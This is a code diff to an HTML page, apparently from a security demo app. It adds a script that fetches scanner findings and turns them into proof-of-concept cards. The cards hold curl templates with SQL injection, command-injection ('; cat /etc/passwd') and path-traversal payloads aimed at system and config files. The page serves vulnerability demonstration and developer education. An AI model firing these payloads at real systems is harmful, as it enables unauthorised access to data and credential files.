@@ -669,7 +669,286 @@ curl "http://imageservice/getphoto?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"</c
     </div>
 
     <script>
-        hljs.highlightAll();
+        // Configuration
+        const CONFIG = {
+            orgId: '545a3bce-97c5-4732-af38-1ac459087b0a',
+            applications: [
+                { appId: 'f1df5e87-5088-42a3-be76-5bdd4457cbb3', name: 'cargo-cats-frontgateservice' },
+                { appId: 'bd4637f1-9976-4036-ad33-b2275417d141', name: 'cargo-cats-dataservice' },
+                { appId: 'e6035803-486c-4976-8b53-3cf307ba8cc1', name: 'cargo-cats-webhookservice' },
+                { appId: '84e7660a-5b4c-4770-951d-f9abf023a8c8', name: 'cargo-cats-imageservice' },
+                { appId: '9b762b48-fc24-4ab1-9847-124475fbd2f1', name: 'cargo-cats-labelservice' }
+            ]
+        };
+
+        // Fetch vulnerabilities
+        async function fetchVulnerabilities() {
+            try {
+                const response = await fetch(`/api/contrast/api/ng/${CONFIG.orgId}/orgtraces/filter?severities=CRITICAL,HIGH&expand=skip_links&limit=10`, {
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to fetch vulnerabilities');
+                    return [];
+                }
+
+                const result = await response.json();
+                return result.traces || [];
+            } catch (error) {
+                console.error('Error fetching vulnerabilities:', error);
+                return [];
+            }
+        }
+
+        // Fetch detailed vulnerability info
+        async function fetchVulnDetails(vulnId, appId) {
+            try {
+                const response = await fetch(`/api/contrast/api/ng/${CONFIG.orgId}/traces/${appId}/trace/${vulnId}?expand=skip_links,card,request`, {
+                    headers: { 'Accept': 'application/json' }
+                });
+
+                if (!response.ok) return null;
+
+                const result = await response.json();
+                return result.trace;
+            } catch (error) {
+                console.error(`Error fetching details for ${vulnId}:`, error);
+                return null;
+            }
+        }
+
+        // Generate POC card HTML
+        function generatePOCCard(vuln) {
+            const severityClass = vuln.severity.toLowerCase();
+            const route = vuln.request?.uri || 'Unknown';
+            const method = vuln.request?.method || 'GET';
+            const httpRequest = vuln.request?.rawRequest || 'Request details not available';
+
+            // Extract parameters from title
+            const paramMatch = vuln.title.match(/from (.*?) (Parameter|on)/i);
+            const parameters = paramMatch ? paramMatch[1] : 'Request';
+
+            // Generate exploitation payloads based on vuln type
+            let exploitPayloads = '';
+            let alternativeTechniques = '';
+
+            if (vuln.rule_name === 'sql-injection') {
+                exploitPayloads = generateSQLInjectionPayloads(route, parameters);
+                alternativeTechniques = generateSQLAlternatives(route);
+            } else if (vuln.rule_name === 'cmd-injection') {
+                exploitPayloads = generateCmdInjectionPayloads(route, parameters);
+                alternativeTechniques = '';
+            } else if (vuln.rule_name === 'path-traversal') {
+                exploitPayloads = generatePathTraversalPayloads(route, parameters);
+                alternativeTechniques = '';
+            }
+
+            // Get vulnerable line from stack trace
+            const vulnLine = vuln.events && vuln.events.length > 0 ?
+                vuln.events.find(e => e.type === 'CREATION' || e.type === 'P2O')?.stacktrace?.[0] || 'Unknown' : 'Unknown';
+
+            // Generate stack trace HTML
+            const stackTraceHTML = (vuln.events && vuln.events.length > 0) ?
+                vuln.events[0].stacktrace?.slice(0, 10).map((frame, idx) => `
+                    <div class="stack-frame ${idx === 0 ? 'vulnerable-frame' : ''}">
+                        ${frame}
+                    </div>
+                `).join('') : '<div class="stack-frame">Stack trace not available</div>';
+
+            return `
+                <div class="vuln-card">
+                    <div class="vuln-header">
+                        <div class="vuln-title">
+                            <h2>${vuln.title}</h2>
+                            <div class="vuln-id">VULN-ID: ${vuln.uuid}</div>
+                        </div>
+                        <div class="severity-badge severity-${severityClass}">${vuln.severity}</div>
+                    </div>
+
+                    <div class="vuln-meta">
+                        <div class="meta-item">
+                            <div class="meta-label">Application</div>
+                            <div class="meta-value">${vuln.application.name.replace('cargo-cats-contrast-', '')}</div>
+                        </div>
+                        <div class="meta-item">
+                            <div class="meta-label">Route</div>
+                            <div class="meta-value">${route}</div>
+                        </div>
+                        <div class="meta-item">
+                            <div class="meta-label">Method</div>
+                            <div class="meta-value">${method}</div>
+                        </div>
+                        <div class="meta-item">
+                            <div class="meta-label">Environment</div>
+                            <div class="meta-value">DEVELOPMENT</div>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-danger">
+                        <div class="alert-icon">⚠️</div>
+                        <div>
+                            <strong>Security Risk:</strong> ${getRiskDescription(vuln.rule_name)}
+                        </div>
+                    </div>
+
+                    <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
+                    <div class="poc-steps">
+                        <div class="step">
+                            <div class="step-number">1</div>
+                            <div class="step-content">
+                                <h4>Identify Vulnerable Parameters</h4>
+                                <p>The vulnerability exists in the <code>${parameters}</code> parameter(s) on the <code>${route}</code> endpoint.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">2</div>
+                            <div class="step-content">
+                                <h4>Review Original Request</h4>
+                                <p>The original HTTP request that triggered the vulnerability detection:</p>
+                                <div class="code-block http-request">
+                                    <pre>${escapeHtml(httpRequest)}</pre>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">3</div>
+                            <div class="step-content">
+                                <h4>Generate Exploit Request</h4>
+                                <p>Craft an exploitation payload to demonstrate the vulnerability:</p>
+                                ${exploitPayloads}
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">4</div>
+                            <div class="step-content">
+                                <h4>Validate Exploitation</h4>
+                                <p>Execute the request and examine the response for signs of successful exploitation.</p>
+                            </div>
+                        </div>
+
+                        <div class="step">
+                            <div class="step-number">5</div>
+                            <div class="step-content">
+                                <h4>Document Findings</h4>
+                                <p>Record the full HTTP request and response to provide evidence of the vulnerability to the development team.</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    ${alternativeTechniques}
+
+                    <h3 class="section-title">🔍 Vulnerable Code Location</h3>
+                    <div class="alert alert-warning">
+                        <div class="alert-icon">⚡</div>
+                        <div>
+                            <strong>Vulnerable Location:</strong> ${vulnLine}
+                        </div>
+                    </div>
+
+                    <div class="code-block stacktrace">
+                        ${stackTraceHTML}
+                    </div>
+
+                    <h3 class="section-title">🛠️ Automated Fixes</h3>
+                    <div class="alert alert-warning">
+                        <div class="alert-icon">🚧</div>
+                        <div>
+                            <strong>Status:</strong> Fixes to be provided soon
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        // Helper functions
+        function getRiskDescription(ruleType) {
+            const risks = {
+                'sql-injection': 'SQL injection allows attackers to manipulate database queries, potentially exposing sensitive data, modifying records, or executing administrative operations.',
+                'cmd-injection': 'OS Command Injection allows attackers to execute arbitrary system commands, potentially leading to complete system compromise, data theft, or service disruption.',
+                'path-traversal': 'Path Traversal vulnerabilities allow attackers to access files outside the intended directory, potentially exposing configuration files, credentials, or application source code.',
+                'xss-reflected': 'Cross-Site Scripting (XSS) allows attackers to inject malicious scripts that execute in victim browsers, potentially stealing credentials, session tokens, or sensitive data.',
+                'xxe': 'XML External Entity (XXE) attacks can expose local files, internal network resources, or cause denial of service.'
+            };
+            return risks[ruleType] || 'This vulnerability poses a significant security risk to the application.';
+        }
+
+        function generateSQLInjectionPayloads(route, params) {
+            return `
+                <div class="curl-command">
+                    <code>curl -X GET "${route}?${params.replace(/"/g, '')}=1234' OR '1'='1" \\
+  -H "Accept: application/json" \\
+  -H "User-Agent: PoC-Generator"</code>
+                </div>
+            `;
+        }
+
+        function generateSQLAlternatives(route) {
+            return `
+                <h3 class="section-title">🎯 Alternative Exploitation Techniques</h3>
+                <div class="tabs">
+                    <div class="tab active" onclick="switchTab(event, 'boolean-sql-${route}')">Boolean-Based Blind</div>
+                    <div class="tab" onclick="switchTab(event, 'union-sql-${route}')">UNION-Based</div>
+                    <div class="tab" onclick="switchTab(event, 'time-sql-${route}')">Time-Based Blind</div>
+                </div>
+
+                <div class="tab-content active" id="boolean-sql-${route}">
+                    <div class="curl-command">
+                        <code># Test for true condition
+curl "${route}?param=1234' AND '1'='1" -s | wc -c
+
+# Test for false condition
+curl "${route}?param=1234' AND '1'='2" -s | wc -c</code>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="union-sql-${route}">
+                    <div class="curl-command">
+                        <code># Extract database version
+curl "${route}?param=1234' UNION SELECT @@version--"</code>
+                    </div>
+                </div>
+
+                <div class="tab-content" id="time-sql-${route}">
+                    <div class="curl-command">
+                        <code># Time-based detection
+curl "${route}?param=1234' AND SLEEP(5)--" -w "Time: %{time_total}s\n"</code>
+                    </div>
+                </div>
+            `;
+        }
+
+        function generateCmdInjectionPayloads(route, params) {
+            return `
+                <div class="curl-command">
+                    <code>curl -X POST "${route}" \\
+  -H "Content-Type: application/json" \\
+  -H "Accept: application/json" \\
+  -d '{"url": "https://example.com; cat /etc/passwd"}'</code>
+                </div>
+            `;
+        }
+
+        function generatePathTraversalPayloads(route, params) {
+            return `
+                <div class="curl-command">
+                    <code># Access /etc/passwd (Linux)
+curl "${route}?${params.replace(/"/g, '')}=../../../../etc/passwd"
+
+# Access web.config (Windows)
+curl "${route}?${params.replace(/"/g, '')}=..\\\\..\\\\..\\\\..\\\\web.config"</code>
+                </div>
+            `;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
 
         function switchTab(event, tabId) {
             // Remove active class from all tabs and contents
@@ -678,8 +957,58 @@ curl "http://imageservice/getphoto?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"</c
 
             // Add active class to clicked tab and corresponding content
             event.target.classList.add('active');
-            document.getElementById(tabId).classList.add('active');
+            const targetContent = document.getElementById(tabId);
+            if (targetContent) targetContent.classList.add('active');
         }
+
+        // Update page with real vulnerability data
+        async function updatePage() {
+            const vulns = await fetchVulnerabilities();
+
+            if (vulns.length === 0) {
+                console.log('No vulnerabilities available - showing static data');
+                return;
+            }
+
+            // Fetch detailed info for first 3 critical/high vulns
+            const detailedVulns = [];
+            for (let i = 0; i < Math.min(3, vulns.length); i++) {
+                const details = await fetchVulnDetails(vulns[i].uuid, vulns[i].application.app_id);
+                if (details) {
+                    detailedVulns.push(details);
+                }
+            }
+
+            if (detailedVulns.length === 0) {
+                console.log('Could not fetch vulnerability details');
+                return;
+            }
+
+            // Replace the container content with generated POC cards
+            const container = document.querySelector('.container');
+            const header = container.querySelector('header');
+            const backLink = container.querySelector('.back-link');
+
+            container.innerHTML = '';
+            container.appendChild(header);
+
+            detailedVulns.forEach(vuln => {
+                const cardHTML = generatePOCCard(vuln);
+                const tempDiv = document.createElement('div');
+                tempDiv.innerHTML = cardHTML;
+                container.appendChild(tempDiv.firstElementChild);
+            });
+
+            container.appendChild(backLink);
+
+            // Re-highlight code blocks
+            hljs.highlightAll();
+        }
+
+        // Initialize on page load
+        document.addEventListener('DOMContentLoaded', updatePage);
+
+        hljs.highlightAll();
     </script>
 </body>
 </html>
